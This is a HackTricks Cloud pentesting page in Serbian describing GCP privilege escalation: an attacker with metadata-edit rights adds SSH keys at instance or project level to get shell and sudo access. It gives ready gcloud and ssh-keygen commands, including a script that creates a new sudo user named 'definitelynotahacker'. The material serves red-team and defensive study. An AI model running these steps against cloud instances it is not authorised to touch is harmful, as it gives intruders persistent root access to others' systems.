# GCP - Dodavanje prilagođenih SSH metapodataka

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Modifikacija metapodataka <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Modifikacija metapodataka na instanci može dovesti do **značajnih sigurnosnih rizika ako napadač stekne potrebne dozvole**.

### **Uključivanje SSH ključeva u prilagođene metapodatke**

Na GCP-u, **Linux sistemi** često izvršavaju skripte iz [Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts). Ključna komponenta ovoga je [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts), koji je dizajniran da **redovno proverava** krajnju tačku metapodataka instance radi **ažuriranja autorizovanih SSH javnih ključeva**.

Stoga, ako napadač može da modifikuje prilagođene metapodatke, može naterati daemon da pronađe novi javni ključ, koji će biti obrađen i **integriran u lokalni sistem**. Ključ će biti dodat u datoteku `~/.ssh/authorized_keys` postojećeg korisnika ili potencijalno kreiranje novog korisnika sa `sudo` privilegijama, zavisno od formata ključa. I napadač će moći da kompromituje host.

### **Dodavanje SSH ključa postojećem privilegovanom korisniku**

1. **Pregled postojećih SSH ključeva na Instanci:**
- Izvršite komandu za opis instance i njenih metapodataka kako biste locirali postojeće SSH ključeve. Relevantni deo u izlazu će biti pod `metadata`, posebno ključ `ssh-keys`.
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
- Obratite pažnju na format SSH ključeva: korisničko ime ide ispred ključa, razdvojeno dvotačkom.

2. **Priprema tekstualne datoteke za SSH ključ metapodatke:**
- Sačuvajte detalje korisničkih imena i njihovih odgovarajućih SSH ključeva u tekstualnu datoteku nazvanu `meta.txt`. Ovo je bitno za čuvanje postojećih ključeva dok dodajete nove.

3. **Generisanje novog SSH ključa za ciljanog korisnika (`alice` u ovom primeru):**
- Koristite `ssh-keygen` komandu za generisanje novog SSH ključa, obezbeđujući da polje komentara (`-C`) odgovara ciljnom korisničkom imenu.
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
- Dodajte novi javni ključ u `meta.txt`, oponašajući format koji se nalazi u metapodacima instance.

4. **Ažuriranje metapodataka SSH ključa instance:**
- Primenite ažurirane metapodatke SSH ključa na instanci koristeći `gcloud compute instances add-metadata` komandu.
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Pristupanje Instanci Koristeći Novi SSH Ključ:**
- Povežite se sa instancom putem SSH koristeći novi ključ, pristupajući shell-u u kontekstu ciljnog korisnika (`alice` u ovom primeru).
```bash
ssh -i ./key alice@localhost
sudo id
```

### **Kreiranje novog privilegovanog korisnika i dodavanje SSH ključa**

Ako nije pronađen nijedan zanimljiv korisnik, moguće je kreirati novog koji će dobiti `sudo` privilegije:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### SSH ključevi na nivou projekta <a href="#sshing-around" id="sshing-around"></a>

Moguće je proširiti pristup SSH-u na više virtuelnih mašina (VMs) u cloud okruženju **primenom SSH ključeva na nivou projekta**. Ovaj pristup omogućava SSH pristup bilo kojoj instanci unutar projekta koja nije eksplicitno blokirala projektne SSH ključeve. Evo sažetog vodiča:

1. **Primenite SSH ključeve na nivou projekta:**
- Koristite `gcloud compute project-info add-metadata` komandu da dodate SSH ključeve iz `meta.txt` u metapodatke projekta. Ova akcija osigurava da se SSH ključevi prepoznaju na svim VMs u projektu, osim ako je VM omogućio opciju "Blokiraj projektne SSH ključeve".
```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **SSH pristup instancama koristeći projektne ključeve:**
- Sa projektim SSH ključevima na mestu, možete se SSH-ovati u bilo koju instancu unutar projekta. Instance koje ne blokiraju projektne ključeve će prihvatiti SSH ključ, omogućavajući pristup.
- Direktan način za SSH-ovanje u instancu je korišćenjem `gcloud compute ssh [INSTANCE]` komande. Ova komanda koristi vaše trenutno korisničko ime i SSH ključeve postavljene na nivou projekta kako bi pokušala pristup.

# Reference
* [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)
